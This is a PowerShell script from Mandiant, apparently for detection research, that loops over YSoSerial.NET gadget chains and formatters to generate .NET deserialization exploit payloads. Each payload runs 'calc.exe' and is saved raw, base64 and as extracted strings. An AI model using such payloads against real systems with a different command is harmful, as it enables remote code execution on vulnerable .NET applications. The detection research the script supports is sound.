# Copyright (C) 2021 Alyssa Rahman, Mandiant, Inc. All Rights Reserved.
# Licensed under the Apache License, Version 2.0 (the "License");
#  you may not use this file except in compliance with the License.
# You may obtain a copy of the License at: [package root]/LICENSE.txt
# Unless required by applicable law or agreed to in writing, software distributed under the License
#  is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and limitations under the License.

##########################################
# YSoSerial.NET v1.34 payload generation #
##########################################
## Author: Alyssa Rahman (@ramen0x3f)
## Last Updated: 2021-12-02 (YSoSerial.NET v1.34)

$ysoserial = '.\ysoserial.net-1.34\ysoserial.exe'

## Some formatters have illegal characters that mess up file output. 
## Lookin at you YamlDotNet<5.0.0
$invalidChars = [IO.Path]::GetInvalidFileNameChars() -join ''
$re = "[{0}]" -f [RegEx]::Escape($invalidChars)

## Gadget/Formatter list retrieved on 2021-11-19
$gadgets_and_formatters = @{
	ActivitySurrogateDisableTypeCheck='BinaryFormatter','LosFormatter','NetDataContractSerializer','SoapFormatter'
	ActivitySurrogateSelector='BinaryFormatter(2)','LosFormatter','SoapFormatter'
	ActivitySurrogateSelectorFromFile='BinaryFormatter(2)','LosFormatter','SoapFormatter'
	AxHostState='BinaryFormatter','LosFormatter','NetDataContractSerializer','SoapFormatter'
	ClaimsIdentity='BinaryFormatter','LosFormatter','SoapFormatter'
	ClaimsPrincipal='BinaryFormatter','LosFormatter','SoapFormatter'
	DataSet='BinaryFormatter','LosFormatter','SoapFormatter'
	ObjectDataProvider='DataContractSerializer(2)','FastJson','FsPickler','JavaScriptSerializer','Json.Net','SharpSerializerBinary','SharpSerializerXml','Xaml(4)','XmlSerializer(2)','YamlDotNet<5.0.0'
	PSObject='BinaryFormatter','LosFormatter','NetDataContractSerializer','SoapFormatter'
	RolePrincipal='BinaryFormatter','DataContractSerializer','Json.Net','LosFormatter','NetDataContractSerializer','SoapFormatter'
	SessionSecurityToken='BinaryFormatter','DataContractSerializer','Json.Net','LosFormatter','NetDataContractSerializer','SoapFormatter'
	SessionViewStateHistoryItem='BinaryFormatter','DataContractSerializer','Json.Net','LosFormatter','NetDataContractSerializer','SoapFormatter'
	TextFormattingRunProperties='BinaryFormatter','DataContractSerializer','LosFormatter','NetDataContractSerializer','SoapFormatter'
	ToolboxItemContainer='BinaryFormatter','LosFormatter','SoapFormatter'
	TypeConfuseDelegate='BinaryFormatter','LosFormatter','NetDataContractSerializer'
	TypeConfuseDelegateMono='BinaryFormatter','LosFormatter','NetDataContractSerializer'
	WindowsClaimsIdentity='BinaryFormatter(3)','DataContractSerializer(2)','Json.Net(2)','LosFormatter(3)','NetDataContractSerializer(3)','SoapFormatter(2)'
	WindowsIdentity='BinaryFormatter','DataContractSerializer','Json.Net','LosFormatter','NetDataContractSerializer','SoapFormatter'
	WindowsPrincipal='BinaryFormatter','DataContractJsonSerializer','DataContractSerializer','Json.Net','LosFormatter','NetDataContractSerializer','SoapFormatter'
}

## Generate all the payloads
foreach ( $gadget in $gadgets_and_formatters.GetEnumerator()) {
	#Unformatted
	Write-Host "[+] Generating $($gadget.Name) payload with defaults"
	& $ysoserial -g "$($gadget.Name)" -c 'calc.exe' -o raw > "$($gadget.Name)_default.bin"
	& $ysoserial -g "$($gadget.Name)" -c 'calc.exe' -o base64 > "$($gadget.Name)_default.base64"
	
	#Note: This may not get us what we need for HeySerial, due to how the formatters work.  
	strings "$($gadget.Name)_default.bin" | grep -E "\..*\." | head -5 > "$($gadget.Name)_default.strings" 

	#With each formatter
	foreach ( $formatter in $gadget.Value.GetEnumerator()) {
		Write-Host "[+] Generating $($gadget.Name) payload with $formatter"
		$filename = "$($gadget.Name)_$($formatter -replace $re)"

		& $ysoserial -g "$($gadget.Name)" -f $formatter -c 'calc.exe' -o raw > "$filename.bin"
		& $ysoserial -g "$($gadget.Name)" -f $formatter -c 'calc.exe' -o base64 > "$filename.base64"

		#Note: This may not get us what we need for HeySerial, due to how the formatters work.  
		strings "$filename.bin" | grep -E "\..*\." | head -5 > "$filename.strings" 
	}
}
